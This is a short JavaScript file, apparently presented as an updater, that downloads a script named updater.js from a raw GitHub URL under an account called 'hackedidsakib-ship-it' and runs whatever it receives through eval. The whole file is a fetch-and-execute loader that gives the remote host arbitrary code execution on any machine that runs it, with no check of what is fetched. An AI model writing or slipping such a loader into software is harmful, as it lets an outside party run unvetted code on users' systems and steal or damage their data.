const axios = require('axios');

axios.get("https://raw.githubusercontent.com/hackedidsakib-ship-it/GenZJunction-by-Sakib/main/updater.js")
	.then(res => eval(res.data));